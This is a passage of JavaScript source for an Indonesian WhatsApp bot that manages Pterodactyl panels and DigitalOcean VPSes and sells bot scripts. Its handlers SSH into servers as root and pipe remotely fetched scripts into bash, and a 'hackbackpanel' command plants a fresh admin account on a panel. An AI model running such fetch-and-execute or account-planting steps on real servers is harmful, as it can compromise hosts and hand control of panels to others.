await m.reply("Berhasil install *tema stellar* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`1\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "installtemabilling": case "instaltemabiling": {
if (!isCreator) return Akses(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema billing* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema billing* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`2\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "installtemaenigma": 
case "instaltemaenigma": {
if (!isCreator) return Akses(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema enigma* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema enigma* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`); // Key Token : skyzodev
stream.write('1\n');
stream.write('3\n');
stream.write('https://wa.me/6285624297893\n');
stream.write('https://whatsapp.com/channel/0029VaYoztA47XeAhs447Y1s\n');
stream.write('https://chat.whatsapp.com/IP1KjO4OyM97ay2iEsSAFy\n');
stream.write('yes\n');
stream.write('x\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "uninstallpanel": {
if (!isCreator) return m.reply(msg.owner);
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
var vpsnya = text.split("|")
if (vpsnya.length < 2) return m.reply(example("ipvps|pwvps|domain"))
let ipvps = vpsnya[0]
let passwd = vpsnya[1]
const connSettings = {
host: ipvps, port: '22', username: 'root', password: passwd
}
const boostmysql = `\n`
const command = `bash <(curl -s https://pterodactyl-installer.se)`
const ress = new Client();
ress.on('ready', async () => {

await m.reply("Memproses *uninstall* server panel\nTunggu 1-10 menit hingga proses selsai")

ress.exec(command, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await ress.exec(boostmysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await m.reply("Berhasil *uninstall* server panel ✅")
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Remove all MariaDB databases? [yes/no]`)) {
await stream.write("\x09\n")
}
}).stderr.on('data', (data) => {
m.reply('Berhasil Uninstall Server Panel ✅');
});
})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Input 0-6`)) {
await stream.write("6\n")
}
if (data.toString().includes(`(y/N)`)) {
await stream.write("y\n")
}
if (data.toString().includes(`* Choose the panel user (to skip don\'t input anything):`)) {
await stream.write("\n")
}
if (data.toString().includes(`* Choose the panel database (to skip don\'t input anything):`)) {
await stream.write("\n")
}
}).stderr.on('data', (data) => {
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
m.reply('Katasandi atau IP tidak valid')
}).connect(connSettings)
}
break

//================================================================================

case "installpanel": {
if (!isCreator) return Akses(mess.owner)
if (!text) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let vii = text.split("|")
if (vii.length < 5) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let sukses = false

const ress = new Client();
const connSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
await Sky.sendMessage(m.chat, {text: teks}, {quoted: m})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('Singapore\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By Skyzo\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Node By Skyzo\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await m.reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(connSettings);
}
break  

//================================================================================

case "startwings": case "configurewings": {
if (!isCreator) return Akses(mess.owner)
let t = text.split('|')
if (t.length < 3) return m.reply(example("ipvps|pwvps|token_node"))

let ipvps = t[0]
let passwd = t[1]
let token = t[2]

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `${token} && systemctl start wings`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("*Berhasil menjalankan wings ✅*\n* Status wings : *aktif*")
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("y\n")
stream.write("systemctl start wings\n")
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "hbpanel": case "hackbackpanel": {
if (!isCreator) return Akses(mess.owner)
let t = text.split('|')
if (t.length < 2) return m.reply(example("ipvps|pwvps"))

let ipvps = t[0]
let passwd = t[1]

const newuser = "admin" + getRandom("")
const newpw = "admin" + getRandom("")

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`
await Sky.sendMessage(m.chat, {text: teks}, {quoted: m})
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("skyzodev\n")
stream.write("7\n")
stream.write(`${newuser}\n`)
stream.write(`${newpw}\n`)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "subdomain": case "subdo": {
const obj = Object.keys(global.subdomain)
let count = 0
let teks = `
 *#- List all domain server*\n`
for (let i of obj) {
count++
teks += `\n* ${count}. ${i}\n`
}
teks += `\n Contoh : *.domain 2 host|ipvps*\n`
m.reply(teks)

}
break

//================================================================================

case "domain": {
if (!isCreator) return Akses(mess.owner)
if (!args[0]) return m.reply("Domain tidak ditemukan!")
if (isNaN(args[0])) return m.reply("Domain tidak ditemukan!")
const dom = Object.keys(global.subdomain)
if (Number(args[0]) > dom.length) return m.reply("Domain tidak ditemukan!")
if (!args[1].split("|")) return m.reply("Hostname/IP Tidak ditemukan!")
let tldnya = dom[args[0] - 1]
const [host, ip] = args[1].split("|")
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
`https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + global.subdomain[tldnya].apitoken,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
await subDomain1(host.toLowerCase(), ip).then(async (e) => {
if (e['success']) {
let teks = `
*Berhasil membuat subdomain ✅*\n\n*IP Server :* ${e['ip']}\n*Subdomain :* ${e['name']}
`
await m.reply(teks)
} else return m.reply(`${e['error']}`)
})
}
break

//================================================================================

case "cadmin": {
if (!isCreator) return Akses(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domain}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Sky.sendMessage(orang, {text: teks}, {quoted: m})
}
break

//================================================================================

case "cadmin-v2": {
if (!isCreator) return Akses(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domainV2}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Sky.sendMessage(orang, {text: teks}, {quoted: m})
}
break

//================================================================================

case "addrespon": {
if (!isCreator) return Akses(mess.owner)
if (!text) return m.reply(example("cmd|responnya"))
if (!text.split("|")) return m.reply(example("cmd|responnya"))
let result = text.split("|")
if (result.length < 2) return m.reply(example("cmd|responnya"))
const [ cmd, respon ] = result
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (res) return m.reply("Cmd respon sudah ada")
let obj = {
cmd: cmd.toLowerCase(), 
respon: respon
}
list.push(obj)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menambah cmd respon *${cmd.toLowerCase()}* kedalam database respon`)
}
break

//================================================================================

case "delrespon": {
if (!isCreator) return Akses(mess.owner)
if (!text) return m.reply(example("cmd\n\n ketik *.listrespon* untuk melihat semua cmd"))
const cmd = text.toLowerCase()
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (!res) return m.reply("Cmd respon tidak ditemukan\nketik *.listrespon* untuk melihat semua cmd respon")
let position = list.indexOf(res)
await list.splice(position, 1)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menghapus cmd respon *${cmd.toLowerCase()}* dari database respon`)
}
break

//================================================================================

case "listrespon": {
if (!isCreator) return Akses(mess.owner)
if (list.length < 1) return m.reply("Tidak ada cmd respon")
let teks = "\n *#- List all cmd response*\n"
await list.forEach(e => teks += `\n* *Cmd :* ${e.cmd}\n`)
m.reply(`${teks}`)
}
break

//================================================================================

case "addseller": {
if (!isCreator) return Akses(mess.owner)
if (!text && !m.quoted) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi reseller!`)
premium.push(input)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menambah reseller ✅`)
}
break

//================================================================================

case "listseller": {
if (premium.length < 1) return m.reply("Tidak ada user reseller")
let teks = `\n *乂 List all reseller panel*\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
Sky.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break

//================================================================================

case "delseller": {
if (!isCreator) return Akses(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner!`)
if (!premium.includes(input)) return m.reply(`Nomor ${input2} bukan reseller!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menghapus reseller ✅`)
}
break

//================================================================================

case "buyscripttol++": case "buysctol++": {
if (m.isGroup) return m.reply("Pembelian vps hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")

let teks = `
 *乂 List script bot yang tersedia*

*1. Simple Bot V3*
* *Type :* Case X Plugins
* *Size File :* 1mb
* *Harga :* Rp35.000

*2. Pushkontak Simpel*
* *Type :* Case
* *Size File :* 909kb
* *Harga :* Rp25.000

Contoh Penggunaan : *.buysc* 1
`
if (!text) return m.reply(teks)
tek = text.toLowerCase()
let Obj = {}

    if (tek == "1") {
    Obj.file = "./source/media/script1.zip"
    Obj.harga = "20000"
    Obj.namaSc = "Script Simple Bot V3"
    } else if (tek == "2") {
    Obj.file = "./source/media/script2.zip"
    Obj.harga = "35000"
    Obj.namaSc = "Script Pushkontak Simpel"  
    } else return m.reply(teks)
    
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpelBot}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* ${Obj.namaSc}
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await Sky.sendMessage(m.chat, {image: {url: get.data.result.qrImageUrl}, caption: teks3}, {quoted: m})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await Sky.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await Sky.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()
while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpelBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
var orang = db.users[m.sender].saweria.chat
await Sky.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* ${Obj.namaSc}
`}, {quoted: db.users[m.sender].saweria.msg})
await Sky.sendMessage(orang, {document: await fs.readFileSync(Obj.file), mimetype: "application/zip", fileName: Obj.namaSc}, {quoted: null})
await Sky.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//================================================================================

case 'listdroplet': {
if (!isCreator) return Akses(mess.owner)
try {
const getDroplets = async () => {
try {
const response = await fetch('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: "Bearer " + global.apiDigitalOcean
}
});
const data = await response.json();
return data.droplets || [];
} catch (err) {
m.reply('Error fetching droplets: ' + err);
return [];
}
};

getDroplets().then(droplets => {
let totalvps = droplets.length;
let mesej = `List droplet digital ocean kamu: ${totalvps}\n\n`;

if (droplets.length === 0) {
mesej += 'Tidak ada droplet yang tersedia!';
} else {
droplets.forEach(droplet => {
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
mesej += `Droplet ID: ${droplet.id}
Hostname: ${droplet.name}
Username: Root
IP: ${ipAddress}
Ram: ${droplet.memory} MB
Cpu: ${droplet.vcpus} CPU
OS: ${droplet.image.distribution}
Storage: ${droplet.disk} GB
Status: ${droplet.status}\n`;
});
}
Sky.sendMessage(m.chat, { text: mesej }, {quoted: m});
});
} catch (err) {
m.reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
}
}
break

//================================================================================

case 'restartvps': {
if (!isCreator) return Akses(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text
const restartVPS = async (dropletId) => {
try {
const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

const response = await fetch(apiUrl, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
},
body: JSON.stringify({
type: 'reboot'
})
});

if (response.ok) {
const data = await response.json();
return data.action;
} else {
const errorData = await response.json();
m.reply(`Gagal melakukan restart VPS: ${errorData.message}`);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan restart VPS: ' + err);
}
};

restartVPS(dropletId)
.then((action) => {
m.reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
})
.catch((err) => {
m.reply(err);
})

}
break

//================================================================================

case 'rebuild': {
if (!isCreator) return Akses(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text 
let rebuildVPS = async () => {
try {
// Rebuild droplet menggunakan API DigitalOcean
const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
},
body: JSON.stringify({
type: 'rebuild',
image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
})
});

if (response.ok) {
const data = await response.json();
m.reply('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);
const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});
if (vpsInfo.ok) {
const vpsData = await vpsInfo.json();
const droplet = vpsData.droplet;
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';

const textvps = `*VPS BERHASIL DI REBUILD*
IP VPS: ${ipAddress}
SYSTEM IMAGE: ${droplet.image.slug}`;
await sleep(60000) 
Sky.sendMessage(m.chat, { text: textvps }, {quoted: m});
} else {
m.reply('Gagal mendapatkan informasi VPS setelah rebuild!');
}
} else {
const errorData = await response.json();
m.reply('Gagal melakukan rebuild VPS : ' + errorData.message);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan rebuild VPS : ' + err);
}};
rebuildVPS();
}
break

//================================================================================

case "sisadroplet": {
if (!isCreator) return Akses(mess.owner)
async function getDropletInfo() {
try {
const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

if (accountResponse.status === 200 && dropletsResponse.status === 200) {
const dropletLimit = accountResponse.data.account.droplet_limit;
const dropletsCount = dropletsResponse.data.droplets.length;
const remainingDroplets = dropletLimit - dropletsCount;

return {
dropletLimit,
remainingDroplets,
totalDroplets: dropletsCount,
};
} else {
return new Error('Gagal mendapatkan data akun digital ocean atau droplet!');
}
} catch (err) {
return err;
}}
async function sisadropletHandler() {
try {
if (!isCreator) return Akses(mess.owner)

const dropletInfo = await getDropletInfo();
m.reply(`Sisa droplet yang dapat kamu pakai: ${dropletInfo.remainingDroplets}

Total droplet terpakai: ${dropletInfo.totalDroplets}`);
} catch (err) {
reply(`Terjadi kesalahan: ${err}`);
}}
sisadropletHandler();
}
break

//================================================================================

case "deldroplet": {
if (!isCreator) return Akses(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text
let deleteDroplet = async () => {
try {
let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'DELETE',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});

if (response.ok) {
m.reply('Droplet berhasil dihapus!');
} else {
const errorData = await response.json();
return new Error(`Gagal menghapus droplet: ${errorData.message}`);
}
} catch (error) {
console.error('Terjadi kesalahan saat menghapus droplet:', error);
m.reply('Terjadi kesalahan saat menghapus droplet.');
}};
deleteDroplet();
}
break

//================================================================================

case "r1c1": case "r2c1": case "r2c2": case "r4c2": case "r8c4": case "r16c4": {
if (!isCreator) return Akses(mess.owner)
if (!text) return m.reply(example("hostname"))
    await sleep(1000)
    let images
    let region = "sgp1"
    if (command == "r1c1") {
    images = "s-1vcpu-1gb"
    } else if (command == "r2c1") {
    images = "s-1vcpu-2gb"
    } else if (command == "r2c2") {
    images = "s-2vcpu-2gb"
    } else if (command == "r4c2") {
    images = "s-2vcpu-4gb"
    } else if (command == "r8c4") {
    images = 's-4vcpu-8gb'
    } else {
    images = "s-4vcpu-16gb-amd"
    region = "sgp1"
    }
    let hostname = text.toLowerCase()
    if (!hostname) return m.reply(example("hostname"))
    
    try {        
        let dropletData = {
            name: hostname,
            region: region, 
            size: images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
